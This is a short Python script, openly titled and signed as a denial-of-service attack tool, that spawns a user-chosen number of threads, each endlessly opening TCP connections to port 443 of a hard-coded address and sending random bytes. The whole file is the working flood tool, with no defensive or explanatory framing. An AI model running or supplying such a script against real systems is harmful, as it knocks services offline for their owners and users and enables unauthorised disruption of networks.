# DOS attack with python and socket, threading, time libraries

import time
import socket
import sys
import threading

def create_rnd_msg(msg_size):
	import random

	rnd_msg = ""
	for i in range(0, msg_size):
		ch_rnd = random.randint(0, 255)
		rnd_msg += chr(ch_rnd)
	return rnd_msg

print("\033[92mDenial of service attack..\033[00m\n:)\nAnonymous\n")
time.sleep(3)
site = "192.168.10.50"
thread_count = int(input("Enter the counts of threads: "))
ip = socket.gethostbyname(site)

TCP_PORT = 443
print("TCP target ip: ", ip)
print("TCP target port: ", TCP_PORT)
time.sleep(3)

def dos():
    while True:
        MESSAGE = str.encode(create_rnd_msg(8))
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, TCP_PORT))
            sock.send(MESSAGE)
            print(f'Packet Sent Successfully => Message: \033[94m {MESSAGE.decode()} "\033[00m :)')
            sock.close()
        except Exception as e:
            print(f"Connection failed: {e}")
            sock.close()

for i in range(thread_count):
	try:
		threading.Thread(target=dos).start()

	except KeyboardInterrupt:
		sys.exit(0)